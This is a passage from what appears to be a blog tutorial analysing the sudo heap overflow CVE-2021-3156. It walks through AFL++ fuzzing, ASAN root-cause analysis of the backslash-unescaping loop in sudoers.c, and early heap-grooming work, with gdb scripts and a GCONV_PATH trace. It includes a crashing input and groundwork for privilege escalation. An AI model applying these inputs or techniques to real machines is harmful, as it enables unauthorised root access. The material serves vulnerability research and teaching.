</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>05<span style=color:#f92672>]=</span>SHLVL<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>06<span style=color:#f92672>]=</span>LC_CTYPE<span style=color:#f92672>=</span>C.UTF-8
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>07<span style=color:#f92672>]=</span>PS1<span style=color:#f92672>=</span><span style=color:#ae81ff>\[\]\[\]\u\[\]</span>:<span style=color:#ae81ff>\[\]\w\[\]</span>$
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>08<span style=color:#f92672>]=</span>PATH<span style=color:#f92672>=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>09<span style=color:#f92672>]=</span>_<span style=color:#f92672>=</span>/usr/local/bin/sudo-afl
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>10<span style=color:#f92672>]=</span>OLDPWD<span style=color:#f92672>=</span>/home/user/mount/sudoedit/02-exploit
</span></span><span style=display:flex><span>__progname<span style=color:#f92672>=</span>0edit
</span></span><span style=display:flex><span>malloc<span style=color:#f92672>()</span>: invalid size <span style=color:#f92672>(</span>unsorted<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Aborted
</span></span></code></pre></div><p>Still crashing. Awesome!</p><p>With <code>afl-anlyze</code> we can also visualize which bytes are important in our input. <code>afl-analyze</code> takes an input file and attempts to sequentially flip bytes and observe the behavior of the tested program. It then color-codes the input based on which sections appear to be critical and which are (probably) not. It can often offer quick insights into complex file formats. This is useful to run on inputs that crash the binary and we are interested in seeing which parts of the input control the crash:</p><p><img src=/post-resources/CVE-2021-3156/images/afl-analyze.png alt=afl-analyze.png></p><p>It is fascinating to see that AFL++ marks the &ldquo;edit&rdquo; of <code>argv[0]</code> as magic bytes. Same for the <code>\\</code> which is (spoiler alert) the culprit of the crash. These magic values are part of <code>if</code> conditions. An explanation for the categories of bytes that <code>afl-anlyze</code> identifies can be found in <a href=https://afl-1.readthedocs.io/en/latest/about_afl.html#the-afl-analyze-tool target=_blank rel="noopener noreferrer">afl-1.readthedocs.io/en/latest/about_afl.html#the-afl-analyze-tool</a>.</p><h3 id=root-cause-analysis>Root cause analysis</h3><p>We have a crash. Some memory got corrupted and <code>malloc</code> failed. We need to identify the exact location where the memory corruption happens.</p><p>It is important to understand that the effects of memory corruption are not visible immidetly. There is a bug in the code and when that happens memory gets corrupted. However, the program might not immidietely crash. It might continue on and when accessing the corrupted memroy, because of the corruption and unexpected contents and structure, it will crash.</p><p>For example, memory corruption happened and caused overwritting of a neighboring object. The object is not processed until 100 function calls away. When the object is processed, the program crashes because of malformed data in that object.</p><p>So, with root cause analysis we aim to pinpoint exactly the offending source code line (bug) that causes memory corruption and subsequently the crash.</p><p>Since we have a heap memory corruption as shown by our input earlier, we will use <a href=https://clang.llvm.org/docs/AddressSanitizer.html#introduction target=_blank rel="noopener noreferrer">ASAN</a> to find it. Let&rsquo;s rebuild <code>sudo</code> with ASAN and debug information but without AFL++ this time. Still, we will pass arguments in AFL++ style (<code>-DAFL_ARGV</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># https://clang.llvm.org/docs/AddressSanitizer.html#usage</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Same clang version as afl-clang-fast</span>
</span></span><span style=display:flex><span>CFLAGS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-fsanitize=address -fno-omit-frame-pointer -ggdb -O0&#34;</span>
</span></span><span style=display:flex><span>LDFLAGS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-fsanitize=address&#34;</span>
</span></span><span style=display:flex><span>CC<span style=color:#f92672>=</span>clang-14 CXX<span style=color:#f92672>=</span>clang++-14 <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    CPPFLAGS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-DAFL_ARGV&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    CFLAGS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$CFLAGS<span style=color:#e6db74>&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    CXXFLAGS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$CFLAGS<span style=color:#e6db74>&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    LDFLAGS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$LDFLAGS<span style=color:#e6db74>&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    ./configure --disable-shared
</span></span><span style=display:flex><span>make clean <span style=color:#f92672>&amp;&amp;</span> make
</span></span><span style=display:flex><span>make install
</span></span><span style=display:flex><span>cp /usr/local/bin/sudo /usr/local/bin/sudo-asan
</span></span><span style=display:flex><span>chmod +s /usr/local/bin/sudo-asan
</span></span></code></pre></div><p>Let&rsquo;s run <code>sudo-asan</code> binary now with the <code>mnimized.in</code> input:</p><p><img src=/post-resources/CVE-2021-3156/images/asan.png alt=asan></p><p>Awesome! We know exactly the source code location! The crash above shows that it is a haep-buffer-overflow that happened at <code>sudoers.c:887</code> and the overflown buffer was allocated at <code>sudoers.c:865</code>. Let&rsquo;s examine!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// sudoers.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>860</span><span style=color:#f92672>:</span>    <span style=color:#75715e>/* Alloc and build up user_args. */</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>861</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>for</span> (size <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, av <span style=color:#f92672>=</span> NewArgv <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>; <span style=color:#f92672>*</span>av; av<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span><span style=color:#ae81ff>862</span><span style=color:#f92672>:</span>    size <span style=color:#f92672>+=</span> <span style=color:#a6e22e>strlen</span>(<span style=color:#f92672>*</span>av) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>863</span><span style=color:#f92672>:</span>    
</span></span><span style=display:flex><span><span style=color:#ae81ff>864</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>865</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>if</span> (size <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> (user_args <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(size)) <span style=color:#f92672>==</span> NULL) {  <span style=color:#75715e>//OFFENDING malloc
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>866</span><span style=color:#f92672>:</span>    <span style=color:#a6e22e>sudo_warnx</span>(<span style=color:#a6e22e>U_</span>(<span style=color:#e6db74>&#34;%s: %s&#34;</span>), __func__, <span style=color:#a6e22e>U_</span>(<span style=color:#e6db74>&#34;unable to allocate memory&#34;</span>));
</span></span><span style=display:flex><span><span style=color:#ae81ff>867</span><span style=color:#f92672>:</span>    <span style=color:#a6e22e>debug_return_int</span>(<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>868</span><span style=color:#f92672>:</span> }
</span></span><span style=display:flex><span><span style=color:#75715e>//.............
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>883</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>for</span> (to <span style=color:#f92672>=</span> user_args, av <span style=color:#f92672>=</span> NewArgv <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>; (from <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>av); av<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span><span style=color:#ae81ff>884</span><span style=color:#f92672>:</span>     <span style=color:#66d9ef>while</span> (<span style=color:#f92672>*</span>from) {
</span></span><span style=display:flex><span><span style=color:#ae81ff>885</span><span style=color:#f92672>:</span>     <span style=color:#66d9ef>if</span> (from[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;\\&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>isspace</span>((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span>)from[<span style=color:#ae81ff>1</span>]))
</span></span><span style=display:flex><span><span style=color:#ae81ff>886</span><span style=color:#f92672>:</span>         from<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>887</span><span style=color:#f92672>:</span>     <span style=color:#f92672>*</span>to<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>from<span style=color:#f92672>++</span>;  <span style=color:#75715e>//OFFENDING LINE
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>888</span><span style=color:#f92672>:</span>     }
</span></span><span style=display:flex><span><span style=color:#ae81ff>889</span><span style=color:#f92672>:</span>     <span style=color:#f92672>*</span>to<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39; &#39;</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>890</span><span style=color:#f92672>:</span> }
</span></span></code></pre></div><h3 id=further-analysis>Further analysis</h3><p>Now we have found the bug! We can dig deeper to figure out &ldquo;why&rdquo; there is a bug in that source code snippter above. Well, the for-loop simply copites <code>NewArgv</code> (which is a partial copy of <code>argv</code>) to <code>user_args</code>. During the copy, if it finds a backslash, it skips it and copies the next character, kinda like unescaping things. However, if the last character of an argument is a backslash, then the next character is a NULL byte, and <code>from</code> will be increased twice before being checked in the <code>while</code> condition. So, the <code>while</code> loop will keep copying past the terminating NULL byte.</p><p>We can load the program and the crashing input to <code>gdb</code> to analyze the bug further and can also add some more <code>printf</code>s:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/plugins/sudoers/sudoers.c b/plugins/sudoers/sudoers.c
</span></span><span style=display:flex><span>index 6c5bcfd..843d0dc 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/plugins/sudoers/sudoers.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/plugins/sudoers/sudoers.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -848,9 +852,16 @@ set_cmnd(void)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            char *to, *from, **av;
</span></span><span style=display:flex><span>            size_t size, n;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>+           fprintf(stderr, &#34;NewArgc=%d\n&#34;, NewArgc);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+           for(int i=0; i&lt;NewArgc; i++) {
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+               fprintf(stderr, &#34;NewArgv[%d]=%p=%s\n&#34;, i, NewArgv[i], NewArgv[i]);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+           }
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>            /* Alloc and build up user_args. */
</span></span><span style=display:flex><span>            for (size = 0, av = NewArgv + 1; *av; av++)
</span></span><span style=display:flex><span>                size += strlen(*av) + 1;
</span></span><span style=display:flex><span><span style=color:#a6e22e>+           fprintf(stderr, &#34;size=0x%lx\n&#34;, size);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>            if (size == 0 || (user_args = malloc(size)) == NULL) {
</span></span><span style=display:flex><span>                sudo_warnx(U_(&#34;%s: %s&#34;), __func__, U_(&#34;unable to allocate memory&#34;));
</span></span><span style=display:flex><span>                debug_return_int(-1);
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -861,11 +872,19 @@ set_cmnd(void)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                 * escapes potential meta chars.  We unescape non-spaces
</span></span><span style=display:flex><span>                 * for sudoers matching and logging purposes.
</span></span><span style=display:flex><span>                 */
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>+               // `from` points to: argv-fuzz-inl.h:afl_init_argv.in_buf+XX `static` buffer
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>                for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
</span></span><span style=display:flex><span>                    while (*from) {
</span></span><span style=display:flex><span>                        if (from[0] == &#39;\\&#39; &amp;&amp; !isspace((unsigned char)from[1]))
</span></span><span style=display:flex><span>                            from++;
</span></span><span style=display:flex><span><span style=color:#f92672>-                       *to++ = *from++;
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+                       *to++ = *from++;        //OFFENDING LINE
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>                    }
</span></span><span style=display:flex><span>                    *to++ = &#39; &#39;;
</span></span><span style=display:flex><span>                }
</span></span></code></pre></div><h2 id=exploitation>Exploitation</h2><p>Okay so now we understand the bug pretty well. Let&rsquo;s see if we can exploit the bug to escalate privileges.</p><h3 id=exploitation-strategy>Exploitation strategy</h3><p>Our exploitation strategy here is pretty limited. This is a &ldquo;one-shot&rdquo; exploit. Our only interactions with <code>sudo</code> are the <code>argv</code> and environment variables. Afterwards, we run and and have no interaction with the binary until the memory corruption happens. This means that we do not have leaks. At best we can do partial address overwrites and data-only attacks.</p><p>Since we have a heap overflow, we need to manipulate the layout of the heap (heap feng shui) so that there is an &ldquo;interesting&rdquo; adjuscent chucnk where we overflow into. To do so, we write our own heap fuzzer. There are various reasons why we do not use AFL++:</p><ol><li>AFL++ instrumentation passes and runtime affect heap feng shui in a negative way. If we find an interesting heap layout with AFL++, this will not be reproducible in the original binary. We want to be as close to the original binary as possible. Ideally, we wouldn&rsquo;t recompile the binary and instead fuzz it as it is supposed to run on a system.</li><li>We want to fuzz on the input <em><strong>size</strong></em>. We do not care about the contents.</li><li>We do not care about code coverage.</li><li>We want to fuzz environment variables also.</li></ol><p>The deal-breaker here is point 1. AFL++ would mess up the heap layout too much. Instead, we will write our own heap fuzzer in python and use gdb to analyze information from crashes. (Or at least I am incomptenet enough apply AFL++ for this task.)</p><h3 id=identifying-inputs>Identifying inputs</h3><p>First, we do some analysis. We need to figure our which of our inputs cotonrol our allocations. Basically we want to do <strong>taint analysis</strong>, where our sources are input lengths (argc, argv, envp) and our sinks are the size argument to malloc/calloc calls. I am unaware of some taint analysis framework that can automagically (and without significant engineering effort) tell us this information. So, let&rsquo;s go with ad-hoc gdb analysis and source code review instead:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>//Total size of argv
</span></span></span><span style=display:flex><span><span style=color:#75715e>//sudoers.c:set_cmnd
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>/* Alloc and build up user_args. */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (size <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, av <span style=color:#f92672>=</span> NewArgv <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>; <span style=color:#f92672>*</span>av; av<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>    size <span style=color:#f92672>+=</span> <span style=color:#a6e22e>strlen</span>(<span style=color:#f92672>*</span>av) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;size=0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (size <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> (user_args <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(size)) <span style=color:#f92672>==</span> NULL)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Total size of env
</span></span></span><span style=display:flex><span><span style=color:#75715e>// env.c:env_init
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>len <span style=color:#f92672>=</span> (<span style=color:#66d9ef>size_t</span>)(ep <span style=color:#f92672>-</span> envp);
</span></span><span style=display:flex><span>env.env_size <span style=color:#f92672>=</span> len <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>128</span>;
</span></span><span style=display:flex><span>env.envp <span style=color:#f92672>=</span> <span style=color:#a6e22e>reallocarray</span>(NULL, env.env_size, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>));
</span></span></code></pre></div><p>We further gather information at runtime. We use a simple gdb script that hooks <code>malloc</code> and <code>calloc</code> calls and dumps a backtrace:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># gdbscript that hooks all allocations</span>
</span></span><span style=display:flex><span><span style=color:#75715e># We use vanila gdb with `--nh`</span>
</span></span><span style=display:flex><span><span style=color:#75715e># We use `stdbuf`, otherwise some input is omitted</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Run as:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># stdbuf -o 0 gdb ./0edit -x startup.2.gdb -iex &#39;set pagination off&#39; -q --nh &gt; startup.2.gdb.out 2&gt;&amp;1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add-symbol-file /usr/local/libexec/sudo/libsudo_util.so.0
</span></span><span style=display:flex><span>add-symbol-file /usr/local/libexec/sudo/sudoers.so
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># crashing input:</span>
</span></span><span style=display:flex><span>set args -hB -i AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style=color:#ae81ff>\\</span> BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
</span></span><span style=display:flex><span>start
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b *malloc
</span></span><span style=display:flex><span>command $bpnum
</span></span><span style=display:flex><span>    bt
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>end
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b *calloc
</span></span><span style=display:flex><span>command $bpnum
</span></span><span style=display:flex><span>    bt
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>end
</span></span><span style=display:flex><span><span style=color:#66d9ef>continue</span>
</span></span></code></pre></div><p>At the backtrace we can look for strings that we know belong to our input. But which inputs shall we manipulate besides <code>argv</code>? Let&rsquo;s also gather potential environment variables that get accessed by <code>sudo</code> by inserting a breakpoint at <code>getenv</code>. This is not foolproof as unset env variables and env variables accessed via <code>envp</code> will be missed. Still, here is the script and the output list:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>b getenv
</span></span><span style=display:flex><span>command $bpnum
</span></span><span style=display:flex><span>    silent
</span></span><span style=display:flex><span>    printf <span style=color:#e6db74>&#34;getenv called: %s\n&#34;</span>, <span style=color:#f92672>(</span>char*<span style=color:#f92672>)</span>$rdi
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>end
</span></span></code></pre></div><p>Results:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GCONV_PATH
</span></span><span style=display:flex><span>LANG
</span></span><span style=display:flex><span>LC_ADDRESS
</span></span><span style=display:flex><span>LC_ALL
</span></span><span style=display:flex><span>LC_COLLATE
</span></span><span style=display:flex><span>LC_CTYPE
</span></span><span style=display:flex><span>LC_IDENTIFICATION
</span></span><span style=display:flex><span>LC_MEASUREMENT
</span></span><span style=display:flex><span>LC_MESSAGES
</span></span><span style=display:flex><span>LC_MONETARY
</span></span><span style=display:flex><span>LC_NAME
</span></span><span style=display:flex><span>LC_NUMERIC
</span></span><span style=display:flex><span>LC_PAPER
</span></span><span style=display:flex><span>LC_TELEPHONE
</span></span><span style=display:flex><span>LC_TIME
</span></span><span style=display:flex><span>LOCPATH
</span></span><span style=display:flex><span>SHELL
</span></span><span style=display:flex><span>TZ
</span></span></code></pre></div><p><em>(Note: When running gdb for automated tasks like this, it is good to disable any plugins such as gef or pwndbg. Experience has shown that these plugins throw weird errors when breakpoints are hit and continued in a non-interactive way.)</em></p><p>Now, we can set those environment variables one-by-one and examine the backtraces (through the same gdbscript from above) to see if they affect allowcations:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>// <span style=color:#e6db74>`</span>GCONV_PATH<span style=color:#e6db74>`</span>. Various Paths have been created
</span></span><span style=display:flex><span>Breakpoint 3, __GI___libc_malloc <span style=color:#f92672>(</span>bytes<span style=color:#f92672>=</span>bytes@entry<span style=color:#f92672>=</span>62<span style=color:#f92672>)</span> at ./malloc/malloc.c:3288
</span></span><span style=display:flex><span>3288	in ./malloc/malloc.c
</span></span><span style=display:flex><span><span style=color:#75715e>#0  __GI___libc_malloc (bytes=bytes@entry=62) at ./malloc/malloc.c:3288</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007a8a00d06bfd in gconv_parseconfdir (dir_len=46, dir=0x593a49a7fa20 &#34;/home/user/mount/sudoedit/02-exploit/QQQQQQQQ/&#34;, prefix=0x0) at ./gconv_parseconfdir.h:125</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#2  __gconv_read_conf () at ./iconv/gconv_conf.c:480</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x00007a8a00d6af97 in __pthread_once_slow (once_control=0x7a8a00eb0a4c &lt;once&gt;, init_routine=0x7a8a00d06b50 &lt;__gconv_read_conf&gt;) at ./nptl/pthread_once.c:116</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#4  0x00007a8a00d6b075 in ___pthread_once (once_control=&lt;optimized out&gt;, init_routine=&lt;optimized out&gt;) at ./nptl/pthread_once.c:143</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#5  0x00007a8a00d06e53 in __gconv_load_conf () at ./iconv/gconv_conf.c:528</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#6  0x00007a8a00d05b79 in __gconv_compare_alias (name1=name1@entry=0x7fff767b8bb0 &#34;UTF-8//&#34;, name2=name2@entry=0x7fff767b8bc0 &#34;UTF-8//&#34;) at ./iconv/gconv_db.c:707</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#7  0x00007a8a00d0fcbe in _nl_find_locale (locale_path=&lt;optimized out&gt;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7fff767b8cb0) at ../iconv/gconv_charset.h:87</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#8  0x00007a8a00d0f38c in __GI_setlocale (category=0, locale=&lt;optimized out&gt;) at ./locale/setlocale.c:337</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#9  0x0000593a489d5417 in main (argc=5, argv=0x7fff767b9098, envp=0x7fff767b90c8) at ./sudo.c:192</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Breakpoint 3, __GI___libc_malloc <span style=color:#f92672>(</span>bytes<span style=color:#f92672>=</span>bytes@entry<span style=color:#f92672>=</span>472<span style=color:#f92672>)</span> at ./malloc/malloc.c:3288
</span></span><span style=display:flex><span>3288	in ./malloc/malloc.c
</span></span><span style=display:flex><span><span style=color:#75715e>#0  __GI___libc_malloc (bytes=bytes@entry=472) at ./malloc/malloc.c:3288</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007a8a00d531fb in __fopen_internal (filename=filename@entry=0x593a49a7fa80 &#34;/home/user/mount/sudoedit/02-exploit/QQQQQQQQ/gconv-modules&#34;, mode=mode@entry=0x7a8a00e729d4 &#34;rce&#34;, is32=is32@entry=1)</span>
</span></span><span style=display:flex><span>    at ./libio/iofopen.c:65
</span></span><span style=display:flex><span><span style=color:#75715e>#2  0x00007a8a00d532da in _IO_new_fopen (filename=filename@entry=0x593a49a7fa80 &#34;/home/user/mount/sudoedit/02-exploit/QQQQQQQQ/gconv-modules&#34;, mode=mode@entry=0x7a8a00e729d4 &#34;rce&#34;) at ./libio/iofopen.c:86</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x00007a8a00d06874 in read_conf_file (filename=filename@entry=0x593a49a7fa80 &#34;/home/user/mount/sudoedit/02-exploit/QQQQQQQQ/gconv-modules&#34;, </span>
</span></span><span style=display:flex><span>    directory<span style=color:#f92672>=</span>directory@entry<span style=color:#f92672>=</span>0x593a49a7fa20 <span style=color:#e6db74>&#34;/home/user/mount/sudoedit/02-exploit/QQQQQQQQ/&#34;</span>, dir_len<span style=color:#f92672>=</span>dir_len@entry<span style=color:#f92672>=</span>46<span style=color:#f92672>)</span> at ./gconv_parseconfdir.h:55
</span></span><span style=display:flex><span><span style=color:#75715e>#4  0x00007a8a00d06c3d in gconv_parseconfdir (dir_len=46, dir=0x593a49a7fa20 &#34;/home/user/mount/sudoedit/02-exploit/QQQQQQQQ/&#34;, prefix=0x0) at ./gconv_parseconfdir.h:139</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#5  __gconv_read_conf () at ./iconv/gconv_conf.c:480</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#6  0x00007a8a00d6af97 in __pthread_once_slow (once_control=0x7a8a00eb0a4c &lt;once&gt;, init_routine=0x7a8a00d06b50 &lt;__gconv_read_conf&gt;) at ./nptl/pthread_once.c:116</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#7  0x00007a8a00d6b075 in ___pthread_once (once_control=&lt;optimized out&gt;, init_routine=&lt;optimized out&gt;) at ./nptl/pthread_once.c:143</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#8  0x00007a8a00d06e53 in __gconv_load_conf () at ./iconv/gconv_conf.c:528</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#9  0x00007a8a00d05b79 in __gconv_compare_alias (name1=name1@entry=0x7fff767b8bb0 &#34;UTF-8//&#34;, name2=name2@entry=0x7fff767b8bc0 &#34;UTF-8//&#34;) at ./iconv/gconv_db.c:707</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#10 0x00007a8a00d0fcbe in _nl_find_locale (locale_path=&lt;optimized out&gt;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7fff767b8cb0) at ../iconv/gconv_charset.h:87</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#11 0x00007a8a00d0f38c in __GI_setlocale (category=0, locale=&lt;optimized out&gt;) at ./locale/setlocale.c:337</span>
